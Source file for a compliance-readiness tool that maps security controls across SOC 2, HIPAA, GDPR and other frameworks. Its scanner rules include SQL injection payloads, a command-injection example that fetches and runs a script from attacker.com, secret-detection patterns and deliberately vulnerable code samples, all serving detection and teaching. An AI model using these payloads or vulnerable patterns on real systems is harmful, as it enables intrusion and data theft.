/**
 * ComplianceShield - Multi-Framework Audit Readiness Engine
 * Supports: SOC 2 Type II, ISO 27001:2022, HIPAA Security/Privacy, GDPR, PCI-DSS v4, NIST CSF 2.0
 */

// --- 1. Framework Definitions ---
const FRAMEWORKS = [
  { id: 'soc2', name: 'SOC 2 Type II', icon: '🛡️', desc: 'Trust Services Criteria (Security, Availability, Confidentiality)', weight: 1.0 },
  { id: 'iso27001', name: 'ISO/IEC 27001', icon: '🌐', desc: 'Global Information Security Management Standard (ISMS 2022)', weight: 1.0 },
  { id: 'hipaa', name: 'HIPAA Security', icon: '🩺', desc: 'Protected Health Info (PHI) Safeguards (Admin, Tech, Physical)', weight: 1.0 },
  { id: 'gdpr', name: 'GDPR / Privacy', icon: '🇪🇺', desc: 'EU General Data Protection Regulation & Data Subject Rights', weight: 1.0 },
  { id: 'pci', name: 'PCI-DSS v4.0', icon: '💳', desc: 'Payment Card Industry Data Security Standard for Cardholder Data', weight: 0.9 },
  { id: 'nist', name: 'NIST CSF 2.0', icon: '🏛️', desc: 'Cybersecurity Framework (Govern, Protect, Detect, Respond, Recover)', weight: 0.9 }
];

// --- 2. Master Controls Database ---
const CONTROLS = [
  // --- Access & IAM ---
  {
    id: 'IAM-01',
    category: 'Access & IAM',
    title: 'Multi-Factor Authentication (MFA) Enforced',
    desc: 'MFA (TOTP, WebAuthn, or Hardware Keys) is strictly enforced for all administrative consoles, production servers, code repositories, and employee accounts.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC6.1 | ISO 27001 A.8.5 | HIPAA §164.312(d) | PCI-DSS Req 8.4',
    auditorProof: 'Screenshot of SSO/IdP enforcing MFA across 100% of staff, IAM policy JSON enforcing MFA, GitHub/GitLab org settings.',
    remediationTip: 'Enforce SSO via Okta/Google Workspace with WebAuthn/TOTP. Disable raw username/password API access.'
  },
  {
    id: 'IAM-02',
    category: 'Access & IAM',
    title: 'Role-Based Access Control (RBAC) & Least Privilege',
    desc: 'Access permissions follow the principle of least privilege. Production database and infrastructure write privileges are strictly limited to authorized engineers with approval trails.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci', 'nist'],
    citations: 'SOC 2 CC6.2, CC6.3 | ISO 27001 A.5.15 | HIPAA §164.312(a)(1) | GDPR Art 32',
    auditorProof: 'AWS/GCP IAM roles showing separation of dev and prod, database user grants, quarterly access review logs.',
    remediationTip: 'Use separate AWS accounts or GCP projects for Dev and Prod. Enforce Just-In-Time (JIT) temporary elevated access.'
  },
  {
    id: 'IAM-03',
    category: 'Access & IAM',
    title: 'Quarterly User Access Reviews & Instant Deprovisioning',
    desc: 'Formal quarterly access reviews are executed and recorded. Automated deprovisioning revokes all access within 24 hours of employee departure.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci'],
    citations: 'SOC 2 CC6.2 | ISO 27001 A.5.18 | HIPAA §164.308(a)(3) | PCI Req 8.2',
    auditorProof: 'HR termination ticket matched with Okta/Slack/GitHub logoff timestamp within 24h, signed quarterly access review spreadsheets.',
    remediationTip: 'Automate offboarding scripts or SCIM directory sync with HRIS (Rippling, Gusto, BambooHR).'
  },

  // --- Data & Encryption ---
  {
    id: 'DATA-01',
    category: 'Data & Encryption',
    title: 'Encryption in Transit (TLS 1.2+ / HSTS)',
    desc: 'All HTTP traffic is automatically redirected to HTTPS using TLS 1.2 or TLS 1.3 with strong cipher suites and HSTS (HTTP Strict Transport Security) enabled.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci', 'nist'],
    citations: 'SOC 2 CC6.6 | ISO 27001 A.8.24 | HIPAA §164.312(e)(1) | GDPR Art 32(1)(a) | PCI Req 4.1',
    auditorProof: 'SSL Labs A+ test result, ALB/Cloudflare TLS configuration showing TLS 1.0/1.1 disabled.',
    remediationTip: 'Set `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` and enforce TLS 1.3 in reverse proxy/CDN.'
  },
  {
    id: 'DATA-02',
    category: 'Data & Encryption',
    title: 'Encryption at Rest (AES-256) for Databases & Storage',
    desc: 'All production datastores (PostgreSQL, MySQL, MongoDB, S3 buckets, EBS disks) are encrypted at rest using AES-256 with managed KMS keys and automated key rotation.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci', 'nist'],
    citations: 'SOC 2 CC6.1, CC6.7 | ISO 27001 A.8.24 | HIPAA §164.312(a)(2)(iv) | PCI Req 3.5',
    auditorProof: 'RDS / S3 bucket settings showing SSE-KMS enabled, AWS KMS customer-managed key auto-rotation enabled.',
    remediationTip: 'Enable AWS KMS default encryption for all S3 buckets and RDS storage. Block unencrypted volume attachment in terraform.'
  },
  {
    id: 'DATA-03',
    category: 'Data & Encryption',
    title: 'Data Classification & PII/PHI Field Masking',
    desc: 'Sensitive data (SSN, credit card numbers, PHI, passwords) is never logged in plaintext and is masked or tokenized in application logs, APM, and analytics tools.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci'],
    citations: 'SOC 2 CC6.1 | HIPAA §164.312(b) | GDPR Art 32 | PCI Req 3.3, 3.4',
    auditorProof: 'Sample log query from Datadog/CloudWatch showing sanitized request bodies, regex scrubbing filters in Winston/Log4j/Serilog.',
    remediationTip: 'Configure log sanitizers to scrub keys matching `/(password|token|card|ssn|health|dob)/i`.'
  },

  // --- Audit, Logging & Detection ---
  {
    id: 'LOG-01',
    category: 'Audit & Logging',
    title: 'Centralized, Tamper-Evident Audit Logging',
    desc: 'Security events (logins, privilege escalations, data exports, password resets) are forwarded to an immutable centralized log repository with retention of at least 365 days.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC7.2 | ISO 27001 A.8.15 | HIPAA §164.312(b) | PCI Req 10.2, 10.5',
    auditorProof: 'CloudTrail log stream with S3 Object Lock / MFA delete, Datadog/Splunk retention policy showing 1-year archive.',
    remediationTip: 'Forward AWS CloudTrail to an isolated security AWS account with S3 Object Lock in Compliance mode.'
  },
  {
    id: 'LOG-02',
    category: 'Audit & Logging',
    title: 'Real-Time Alerting on Anomalous Access & Threat Detection',
    desc: 'Automated monitoring triggers real-time alerts (via PagerDuty, Slack, or email) upon detecting brute force attempts, unauthorized root account usage, or mass data exfiltration.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC7.3 | ISO 27001 A.8.16 | HIPAA §164.308(a)(1)(ii)(D) | PCI Req 10.6',
    auditorProof: 'AWS GuardDuty enabled, alert notification channel test, runbook for security incident escalation.',
    remediationTip: 'Enable AWS GuardDuty and Security Hub; route findings severity >= HIGH to PagerDuty on-call.'
  },

  // --- Infrastructure & DevSecOps ---
  {
    id: 'OPS-01',
    category: 'Infrastructure & DevSecOps',
    title: 'CI/CD Automated Vulnerability & Dependency Scanning',
    desc: 'Automated SAST (Static Application Security Testing) and SCA (Software Composition Analysis) run on every pull request to block critical CVEs and secrets from merging to main.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'pci', 'nist'],
    citations: 'SOC 2 CC7.1, CC8.1 | ISO 27001 A.8.28 | PCI Req 6.2, 6.3',
    auditorProof: 'GitHub Actions / GitLab CI pipeline showing Snyk/Dependabot/Trivy blocking builds with Critical CVEs.',
    remediationTip: 'Add GitHub Dependabot, Snyk, and GitGuardian secret detection to your pull-request validation workflow.'
  },
  {
    id: 'OPS-02',
    category: 'Infrastructure & DevSecOps',
    title: 'Formal Change Management & Peer Code Review',
    desc: 'Direct commits to production branches (`main`/`master`) are protected. Every code change requires at least one peer approval and passing integration tests.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci'],
    citations: 'SOC 2 CC8.1 | ISO 27001 A.8.32 | HIPAA §164.312(c)(1) | PCI Req 6.4, 6.5',
    auditorProof: 'Branch protection rule configuration screenshot on `main` branch with `Require pull request reviews before merging` checked.',
    remediationTip: 'Enforce branch protection rules with mandatory PR review approvals and signed commits.'
  },
  {
    id: 'OPS-03',
    category: 'Infrastructure & DevSecOps',
    title: 'Automated Daily Backups & Tested Disaster Recovery (DR)',
    desc: 'Database and stateful storage are backed up daily with point-in-time recovery (PITR). Disaster recovery restoration is tested and documented at least once annually.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'nist'],
    citations: 'SOC 2 A1.2, A1.3 | ISO 27001 A.8.13, A.8.14 | HIPAA §164.308(a)(7) | GDPR Art 32(1)(c)',
    auditorProof: 'AWS RDS Automated Backup retention >= 30 days, annual DR drill test report signed by CTO with RTO/RPO targets.',
    remediationTip: 'Enable AWS Backup cross-region copy and schedule an automated dry-run restore test quarterly.'
  },

  // --- Privacy & Data Subject Rights (GDPR / HIPAA Focus) ---
  {
    id: 'PRIV-01',
    category: 'Privacy & Data Rights',
    title: 'Data Subject Right to Erasure / Deletion Endpoint ("Right to Be Forgotten")',
    desc: 'Users can submit account deletion requests. Application code and database workflows reliably purge or anonymize personal data across all datastores within 30 days.',
    severity: 'high',
    frameworks: ['gdpr', 'soc2'],
    citations: 'GDPR Article 17 (Right to Erasure) | SOC 2 Privacy Criteria P4.2',
    auditorProof: 'Documented API route `/api/user/delete-account` or admin deletion workflow, database cascading hard-delete or anonymization scripts.',
    remediationTip: 'Implement an automated queue job that anonymizes PII and triggers soft/hard deletion across primary DB, CRM, and analytics.'
  },
  {
    id: 'PRIV-02',
    category: 'Privacy & Data Rights',
    title: 'Cookie Consent Banner with Prior Consent & Opt-Out',
    desc: 'Non-essential tracking scripts (Google Analytics, Meta Pixel, FullStory) are blocked until the user provides active opt-in consent. Reject All is as easy as Accept All.',
    severity: 'high',
    frameworks: ['gdpr'],
    citations: 'GDPR Article 6, 7 & ePrivacy Directive',
    auditorProof: 'Cookie consent platform configuration (OneTrust, Cookiebot, Klaro) showing zero analytics cookies fired before acceptance.',
    remediationTip: 'Use a compliant CMP like Cookiebot or Klaro. Ensure analytics tags only fire on `consent_status === "granted"`.'
  },
  {
    id: 'PRIV-03',
    category: 'Privacy & Data Rights',
    title: 'Data Subject Export / Portability Endpoint',
    desc: 'Users can download all their personal profile information and activity history in a structured, commonly used machine-readable format (JSON or CSV).',
    severity: 'medium',
    frameworks: ['gdpr'],
    citations: 'GDPR Article 20 (Right to Data Portability)',
    auditorProof: 'User dashboard "Download My Data" button yielding a complete archive zip/json file.',
    remediationTip: 'Create an asynchronous worker that packages user profile, orders, and logs into a password-protected zip file.'
  },
  {
    id: 'PRIV-04',
    category: 'Privacy & Data Rights',
    title: 'HIPAA Business Associate Agreements (BAAs) with All Cloud Vendors',
    desc: 'Signed BAAs are in place with all third-party sub-processors handling Protected Health Information (AWS, Google Cloud, Twilio, SendGrid, Datadog).',
    severity: 'high',
    frameworks: ['hipaa'],
    citations: 'HIPAA §164.502(e) & §164.504(e)',
    auditorProof: 'Executed BAA PDF agreements from AWS, Twilio, and other sub-processors stored in vendor compliance folder.',
    remediationTip: 'Accept the AWS BAA via AWS Artifact console. Audit all third-party APIs for PHI data flows.'
  },
  {
    id: 'PRIV-05',
    category: 'Privacy & Data Rights',
    title: '72-Hour Breach Notification Protocol',
    desc: 'A defined breach response procedure ensures regulators (Data Protection Authorities / HHS OCR) and affected users are notified within 72 hours of incident confirmation.',
    severity: 'high',
    frameworks: ['gdpr', 'hipaa', 'soc2'],
    citations: 'GDPR Article 33, 34 | HIPAA Breach Notification Rule §164.400 | SOC 2 CC7.3',
    auditorProof: 'Written Incident Response Plan with 72-hour regulatory notification template and assigned Incident Commander role.',
    remediationTip: 'Maintain a pre-drafted incident disclosure template and contact list for EU DPAs and legal counsel.'
  },

  // --- Governance & Vendor Risk ---
  {
    id: 'GOV-01',
    category: 'Governance & Vendor Risk',
    title: 'Annual Third-Party Penetration Testing',
    desc: 'An independent certified security penetration testing firm tests the web application and API infrastructure at least once per 12 months with findings remediated.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'pci', 'nist'],
    citations: 'SOC 2 CC7.1 | ISO 27001 A.8.8 | PCI Req 11.3 | NIST CSF DE.CM',
    auditorProof: 'Executive Summary Attestation letter from an accredited pentest firm dated within past 365 days.',
    remediationTip: 'Schedule an annual grey-box web application pen test with firms like Cobalt, HackerOne, or Bishop Fox.'
  },
  {
    id: 'GOV-02',
    category: 'Governance & Vendor Risk',
    title: 'Vendor Risk Assessment & Sub-Processor Management',
    desc: 'All third-party software, cloud services, and contractors are vetted for security certifications (SOC 2, ISO 27001) prior to onboarding and reviewed annually.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'nist'],
    citations: 'SOC 2 CC9.2 | ISO 27001 A.5.19, A.5.21 | GDPR Art 28 (DPA)',
    auditorProof: 'Vendor inventory sheet with current SOC 2 Type II reports and signed Data Processing Addendums (DPAs) on file.',
    remediationTip: 'Maintain a public Sub-processor page and require all B2B vendors to supply their current SOC 2 report.'
  },
  {
    id: 'GOV-03',
    category: 'Governance & Vendor Risk',
    title: 'Annual Security Awareness Training for All Employees',
    desc: 'All personnel with access to corporate networks or code repositories complete interactive security awareness and phishing prevention training annually.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC2.2 | ISO 27001 A.6.3 | HIPAA §164.308(a)(5) | PCI Req 12.6',
    auditorProof: 'Training completion logs from platforms like KnowBe4, Curricula, or Drata showing 100% staff completion.',
    remediationTip: 'Set up automated onboarding training via Drata, Vanta, or KnowBe4 with mandatory completion within 30 days of hire.'
  }
];

// --- 3. Pre-Engineered App Profiles / Presets ---
const PRESETS = {
  custom: {},
  saas: {
    'IAM-01': 'compliant', 'IAM-02': 'compliant', 'IAM-03': 'compliant',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'gap',
    'LOG-01': 'compliant', 'LOG-02': 'gap',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'compliant', 'PRIV-02': 'gap', 'PRIV-03': 'gap', 'PRIV-04': 'gap', 'PRIV-05': 'compliant',
    'GOV-01': 'compliant', 'GOV-02': 'compliant', 'GOV-03': 'compliant'
  },
  health: {
    'IAM-01': 'compliant', 'IAM-02': 'compliant', 'IAM-03': 'compliant',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'compliant',
    'LOG-01': 'compliant', 'LOG-02': 'compliant',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'gap', 'PRIV-02': 'gap', 'PRIV-03': 'gap', 'PRIV-04': 'compliant', 'PRIV-05': 'compliant',
    'GOV-01': 'compliant', 'GOV-02': 'compliant', 'GOV-03': 'compliant'
  },
  fintech: {
    'IAM-01': 'compliant', 'IAM-02': 'compliant', 'IAM-03': 'compliant',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'compliant',
    'LOG-01': 'compliant', 'LOG-02': 'compliant',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'compliant', 'PRIV-02': 'gap', 'PRIV-03': 'gap', 'PRIV-04': 'gap', 'PRIV-05': 'compliant',
    'GOV-01': 'compliant', 'GOV-02': 'compliant', 'GOV-03': 'compliant'
  },
  consumer: {
    'IAM-01': 'compliant', 'IAM-02': 'gap', 'IAM-03': 'gap',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'gap',
    'LOG-01': 'gap', 'LOG-02': 'gap',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'compliant', 'PRIV-02': 'compliant', 'PRIV-03': 'compliant', 'PRIV-04': 'gap', 'PRIV-05': 'compliant',
    'GOV-01': 'gap', 'GOV-02': 'gap', 'GOV-03': 'gap'
  }
};

// --- 4. Policy Templates ---
const POLICY_TEMPLATES = {
  ir: `# INFORMATION SECURITY INCIDENT RESPONSE PLAN (SOC 2 CC7.3 & GDPR ART 33)

## 1. Purpose & Scope
This Incident Response Plan outlines the protocols for identifying, containing, eradicating, and reporting security incidents and personal data breaches for {{APP_NAME}} in compliance with SOC 2 CC7.3, ISO 27001 A.5.24, HIPAA, and GDPR.

## 2. Incident Response Team (IRT)
- **Incident Commander (IC):** Chief Technology Officer / Head of Security
- **Technical Lead:** Lead DevOps / Infrastructure Engineer
- **Legal & Communications Officer:** General Counsel / Data Protection Officer (DPO)

## 3. Incident Classification
- **P1 - Critical (Data Breach / Severe Outage):** Active exfiltration of PII/PHI or total platform disruption.
- **P2 - High (Elevated Privilege / Ransomware attempt):** Compromised administrator credential or ransomware on internal device.
- **P3 - Medium (Suspicious Activity):** Blocked brute force attempt, non-critical vulnerability discovered.

## 4. 72-Hour Regulatory Breach Notification (GDPR & HIPAA)
In accordance with GDPR Article 33 and HIPAA Breach Notification Rule:
1. Upon confirming a breach affecting personal data, the DPO must notify the relevant Data Protection Authority (DPA) within **72 hours**.
2. If the breach poses a high risk to individuals' rights and freedoms, affected users must be notified without undue delay.

## 5. Post-Incident Review
Within 5 business days of incident resolution, the IRT will conduct a Root Cause Analysis (RCA) meeting and document corrective actions.`,

  access: `# ACCESS CONTROL, IDENTITY & MFA POLICY (SOC 2 CC6.1 & ISO 27001 A.8.5)

## 1. Policy Statement
All access to {{APP_NAME}} systems, source code repositories, cloud hosting infrastructure, and customer data stores must adhere strictly to the principle of Least Privilege and Multi-Factor Authentication.

## 2. Multi-Factor Authentication (MFA)
- MFA is mandatory for all corporate email, Single Sign-On (SSO), AWS/GCP management consoles, GitHub, and remote VPNs.
- Acceptable second factors: FIDO2/WebAuthn Hardware keys (Yubikey) or Authenticator App TOTP. SMS-based 2FA is prohibited for administrative access.

## 3. Production Environment Separation
- No human engineer shall possess standing read/write credentials to production databases containing customer data.
- Elevated emergency access ("Break-glass") requires approval from two team leads and expires automatically after 4 hours.

## 4. Deprovisioning & Offboarding
Upon notification of an employee or contractor termination, all user access across all systems must be revoked within twenty-four (24) hours.`,

  retention: `# DATA RETENTION & RIGHT-TO-BE-FORGOTTEN POLICY (GDPR ART 17)

## 1. Objective
Establish standard retention periods and safe erasure mechanisms for customer information stored across {{APP_NAME}} in compliance with GDPR Article 17 and SOC 2 Privacy Criteria.

## 2. Standard Retention Schedules
- **Active Account Data:** Retained for the duration of the active subscription.
- **Deleted Account PII:** Purged or anonymized across primary datastores within 30 days of deletion request.
- **Financial & Transaction Logs:** Retained for 7 years to satisfy statutory tax obligations.
- **Application Security Logs:** Retained in cold storage for 365 days, then automatically purged.

## 3. Execution of Erasure Requests
1. The user requests deletion via Account Settings or by emailing privacy@{{DOMAIN}}.
2. System triggers an asynchronous queue worker to anonymize PII in transactional tables.
3. Sub-processors (CRM, email delivery services) are notified via automated API webhooks.`,

  bcdr: `# BUSINESS CONTINUITY & DISASTER RECOVERY (BCDR) PLAN (SOC 2 A1.2 & ISO 27001 A.8.14)

## 1. Objectives
- **Recovery Point Objective (RPO):** Maximum acceptable data loss is 1 hour.
- **Recovery Time Objective (RTO):** Maximum acceptable downtime to restore critical services is 4 hours.

## 2. Backup Architecture
- Production databases utilize continuous WAL archiving and automated daily snapshots.
- Backups are encrypted at rest with AES-256 and replicated across multi-region cloud zones.

## 3. Annual DR Simulation
The engineering team executes a live failover and restoration test at least once every 12 calendar months. Results and timestamps are recorded for audit compliance.`,

  vendor: `# THIRD-PARTY VENDOR RISK MANAGEMENT POLICY (SOC 2 CC9.2)

## 1. Scope
Applies to all external SaaS providers, cloud vendors, and consultants that process, transmit, or store {{APP_NAME}} data.

## 2. Vendor Onboarding Requirements
Before executing an agreement, vendors must provide:
1. Current SOC 2 Type II or ISO 27001 certification.
2. Signed Data Processing Addendum (DPA) incorporating Standard Contractual Clauses (SCCs).
3. Evidence of data encryption at rest and in transit.

## 3. Annual Review
All Tier-1 critical vendors undergo an annual security posture re-assessment.`,

  hipaa_baa: `# HIPAA BUSINESS ASSOCIATE AGREEMENT (BAA) ADDENDUM

## 1. Parties
This Agreement applies between {{APP_NAME}} ("Business Associate") and Covered Entities utilizing healthcare services in compliance with 45 CFR Part 160 and Part 164.

## 2. Permitted Uses & Disclosures of PHI
Business Associate agrees not to use or disclose Protected Health Information (PHI) other than as permitted or required by this Agreement or as required by law.

## 3. Appropriate Safeguards
Business Associate agrees to implement administrative, physical, and technical safeguards that reasonably and appropriately protect the confidentiality, integrity, and availability of electronic PHI that it creates, receives, maintains, or transmits.

## 4. Breach Notification
Business Associate shall report to Covered Entity any acquisition, access, use, or disclosure of unsecured PHI in violation of HIPAA within five (5) business days of discovery.`
};

// --- 5. Code Security & Secret Scanner Rules Engine ---
const CODE_VULN_RULES = [
  // --- SQL Injection & Database Attacks ---
  {
    id: 'SEC-SQLI-01',
    category: 'Database Attacks',
    title: 'SQL Injection Flaw (Raw Concatenation into Query)',
    severity: 'critical',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'DATA-03',
    test: (line) => {
      const sqlKeywords = /(SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM|DROP\s+TABLE|ALTER\s+TABLE)/i;
      if (!sqlKeywords.test(line)) return false;
      const concatPattern = /(\+\s*[\w\$\.]+|\$\{[^\}]+\}|\%s|\.format\(|f"|f')/i;
      return concatPattern.test(line);
    },
    exploit: 'Attackers can inject malicious SQL payloads (e.g. `\' OR 1=1 --` or `\'; DROP TABLE accounts; --`) to bypass login authorization, exfiltrate private patient/user databases, or overwrite database tables.',
    badCode: `const sql = "SELECT * FROM users WHERE user = '" + input + "'";`,
    goodCode: `// Use Parameterized Prepared Statements ($1, $2 or ?):
const sql = 'SELECT * FROM users WHERE user = $1';
const result = await db.query(sql, [input]);`
  },
  {
    id: 'SEC-SQLI-02',
    category: 'Database Attacks',
    title: 'Direct Dynamic Query Execution without Parameterization',
    severity: 'critical',
    cwe: 'CWE-89: SQL Injection',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'DATA-03',
    test: (line) => {
      return /(db|pool|client|conn|cursor)\.query\s*\(\s*[`'"][^)]*(\+|\$\{)/i.test(line) ||
             /(cursor|db)\.execute\s*\(\s*f["']/i.test(line);
    },
    exploit: 'Dynamic query assembly in database drivers allows full database exfiltration or administrative privilege escalation via URL parameters or JSON request bodies.',
    badCode: `cursor.execute(f"SELECT * FROM patients WHERE id = '{patient_id}'")`,
    goodCode: `# Use SQL Parameter Placeholders:
cursor.execute("SELECT * FROM patients WHERE id = %s", (patient_id,))`
  },

  // --- Hardcoded Secrets & Leaked Keys ---
  {
    id: 'SEC-SECRET-AWS',
    category: 'Secret Leak',
    title: 'Hardcoded AWS Access Key ID Detected',
    severity: 'critical',
    cwe: 'CWE-798: Use of Hard-coded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'IAM-01',
    test: (line) => /(AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}/.test(line),
    exploit: 'Automated internet crawlers scan public code repos within seconds. Leaked AWS keys grant attackers access to spawn rogue crypto-miners, wipe S3 buckets, or hold infrastructure for ransom.',
    badCode: `const AWS_KEY = "AKIAIOSFODNN7EXAMPLE";`,
    goodCode: `// Load from Environment or AWS IAM Roles:
const AWS_KEY = process.env.AWS_ACCESS_KEY_ID;`
  },
  {
    id: 'SEC-SECRET-OPENAI',
    category: 'Secret Leak',
    title: 'Exposed OpenAI / LLM API Key',
    severity: 'critical',
    cwe: 'CWE-798: Hardcoded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'DATA-02',
    test: (line) => /(sk-[a-zA-Z0-9]{32,}|sk-proj-[a-zA-Z0-9_\-]{30,})/.test(line),
    exploit: 'Attackers drain API credit quotas, fine-tune models on your billing card, or access sensitive AI prompt telemetry.',
    badCode: `const client = new OpenAI({ apiKey: "sk-proj-xyz..." });`,
    goodCode: `const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });`
  },
  {
    id: 'SEC-SECRET-GITHUB',
    category: 'Secret Leak',
    title: 'Exposed GitHub Personal Access Token',
    severity: 'critical',
    cwe: 'CWE-798: Hardcoded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'OPS-01',
    test: (line) => /(ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{40,})/.test(line),
    exploit: 'Allows unauthorized threat actors to push backdoors to source code, inject malware into releases, or tamper with CI/CD deployment pipelines.',
    badCode: `const GH_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuv";`,
    goodCode: `const GH_TOKEN = process.env.GITHUB_TOKEN;`
  },
  {
    id: 'SEC-SECRET-DB',
    category: 'Secret Leak',
    title: 'Hardcoded Database URI with Embedded Password',
    severity: 'critical',
    cwe: 'CWE-798: Hardcoded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'DATA-02',
    test: (line) => /(postgres|mysql|mongodb|redis|mariadb):\/\/[a-zA-Z0-9_\-\.]+:[^@\s'"]+@[a-zA-Z0-9_\-\.]+/i.test(line),
    exploit: 'Direct exposure of database connection credentials allows external attackers to dump production tables without needing application-level access.',
    badCode: `const DB_URI = "postgres://admin:P@ssw0rd123@prod-db.internal:5432/main";`,
    goodCode: `const DB_URI = process.env.DATABASE_URL; // Store in AWS Secrets Manager or Vault`
  },
  {
    id: 'SEC-SECRET-JWT',
    category: 'Secret Leak',
    title: 'Hardcoded JWT Secret or Private Encryption Key',
    severity: 'high',
    cwe: 'CWE-321: Use of Hard-coded Cryptographic Key',
    owasp: 'OWASP Top 10 A02:2021 - Cryptographic Failures',
    complianceControl: 'DATA-01',
    test: (line) => {
      if (/BEGIN (RSA|OPENSSH|EC|DSA)? ?PRIVATE KEY/.test(line)) return true;
      return /(JWT_SECRET|jwtSecret|TOKEN_SECRET)\s*=\s*['"][^'"]{8,}['"]/i.test(line);
    },
    exploit: 'Knowing the JWT signing secret allows attackers to forge administrative tokens with arbitrary claims and impersonate any user or superuser.',
    badCode: `jwt.sign(payload, "my_static_secret_key_12345");`,
    goodCode: `jwt.sign(payload, process.env.JWT_SIGNING_KEY);`
  },

  // --- Remote Code Execution & Dangerous Functions ---
  {
    id: 'SEC-RCE-EVAL',
    category: 'Remote Code Execution',
    title: 'Dangerous Dynamic Evaluation (eval / Function constructor)',
    severity: 'critical',
    cwe: 'CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'OPS-01',
    test: (line) => /\b(eval|new\s+Function|vm\.runInThisContext)\s*\(/.test(line),
    exploit: 'Enables Remote Code Execution (RCE). An attacker sending input to eval() can execute arbitrary system commands, spawn reverse shells, or seize host servers.',
    badCode: `const output = eval("calculate(" + req.query.expr + ")");`,
    goodCode: `// Avoid eval! Use safe parser libraries like mathjs or JSON.parse`
  },
  {
    id: 'SEC-CMD-INJECT',
    category: 'Remote Code Execution',
    title: 'Command Injection Sink (child_process.exec / os.system)',
    severity: 'critical',
    cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'OPS-01',
    test: (line) => {
      return /(child_process\.exec|exec\s*\(|os\.system|subprocess\.Popen\([^)]*shell=True)/.test(line) &&
             /(\+|\$\{|\%s|\.format)/.test(line);
    },
    exploit: 'Attackers can append command separators like `;` or `|` (e.g., `8.8.8.8; curl http://attacker.com/malware.sh | sh`) to run arbitrary host commands.',
    badCode: `exec("ping -c 1 " + req.query.target);`,
    goodCode: `// Use execFile with explicit argument arrays, never raw shell strings:
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', req.query.target]);`
  },
  {
    id: 'SEC-XSS-DOM',
    category: 'Injection & XSS',
    title: 'Cross-Site Scripting (XSS) via innerHTML / dangerouslySetInnerHTML',
    severity: 'high',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'OPS-01',
    test: (line) => /(dangerouslySetInnerHTML|\.innerHTML\s*=)/.test(line),
    exploit: 'Attackers can inject malicious `<script>` tags that hijack user sessions, steal authorization cookies, or perform actions on behalf of victims.',
    badCode: `container.innerHTML = "<div>" + userInput + "</div>";`,
    goodCode: `container.textContent = userInput; // or use DOMPurify.sanitize(userInput)`
  },

  // --- Cryptographic Weakness ---
  {
    id: 'SEC-CRYPTO-WEAK',
    category: 'Cryptographic Weakness',
    title: 'Insecure Hashing Algorithm (MD5 / SHA1) for Passwords or Signatures',
    severity: 'high',
    cwe: 'CWE-328: Use of Weak Hash',
    owasp: 'OWASP Top 10 A02:2021 - Cryptographic Failures',
    complianceControl: 'DATA-01',
    test: (line) => /(createHash\(['"](md5|sha1)['"]\)|hashlib\.(md5|sha1)\(|md5\(|sha1\()/i.test(line),
    exploit: 'MD5 and SHA-1 are cryptographically broken with known collision attacks. Password hashes can be reversed almost instantly using public rainbow tables.',
    badCode: `const hash = crypto.createHash('md5').update(password).digest('hex');`,
    goodCode: `// Use slow salted hashing designed for credentials (bcrypt / Argon2):
const hash = await bcrypt.hash(password, 12);`
  }
];

// --- 6. Code Presets for Quick Testing ---
const CODE_PRESETS = {
  sqli: `// ⚠️ VULNERABLE: Direct string concatenation allows database hijack
const express = require('express');
const db = require('./database');
const app = express();

